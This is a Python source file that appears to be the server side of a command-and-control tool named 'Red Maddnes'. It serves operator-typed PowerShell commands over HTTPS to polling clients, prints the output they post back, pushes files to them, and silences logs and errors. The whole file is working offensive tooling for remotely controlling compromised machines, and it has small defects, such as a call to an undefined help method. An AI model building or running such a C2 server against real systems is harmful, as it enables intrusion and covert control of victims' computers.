import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
from termcolor import colored
import os


class UI:
    @staticmethod
    def banner():
        bann = "Red\nMaddnes"
        print(colored(bann, 'red'))
        print(colored("-" * 20, 'red'))
        print('\r')
        print(colored("[SERVER] for help type help\n", 'yellow'))

    @staticmethod
    def clean():
        os.system('cls')


def startPowerShell():
    HOST = 'localhost'
    PORT = 8443
    CERT_FILE = 'E:\Cyber\RootKiteRed101\Project1\certifacte\server.crt'
    KEY_FILE = 'E:\Cyber\RootKiteRed101\Project1\certifacte\server.key'

    server = HTTPSServer(HOST, PORT, CERT_FILE, KEY_FILE)

    server.start()


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            response_data = input(colored("Enter PowerShell command: ", 'red'))
            response_length = len(response_data)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-length', str(response_length))
            self.end_headers()
            self.wfile.write(response_data.encode())
        except ssl.SSLEOFError:
            pass

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        if b'upload' in post_data:
            file_path = input(colored("Enter file path to upload: ", 'red'))
            try:
                with open(file_path, 'rb') as file:
                    file_data = file.read()
                    self.send_header('Content-length', str(len(file_data)))
                    self.end_headers()
                    self.wfile.write(file_data)
            except FileNotFoundError:
                self.wfile.write(b'File not found')
        else:
            print(post_data.decode(), end='')

    def log_message(self, format, *args):
        # Override log_message to suppress log messages
        pass


class HTTPSServer:
    def __init__(self, host, port, cert_file, key_file):
        self.host = host
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file

    def start(self):
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)

        server_address = (self.host, self.port)
        httpd = HTTPServer(server_address, MyHandler)
        httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)

        print(f'Starting HTTPS server on {self.host}:{self.port}...')
        try:
            while True:
                try:
                    httpd.handle_request()
                except Exception:
                    # Handle connection errors silently
                    pass
        except KeyboardInterrupt:
            httpd.shutdown()
            print('\nServer stopped.')


def Start():
    UI.banner()
    while True:
        command = input(colored("[SERVER] Enter your command: ", 'red', attrs=['bold']))
        if command == "exit":
            exit()
        elif (command == "help") or (command == "?"):
            UI.helps()
            continue
        elif command == "clear":
            UI.clean()
        elif command == "powershell":
            startPowerShell()


def main() -> None:
    Start()


if __name__ == '__main__':
    main()
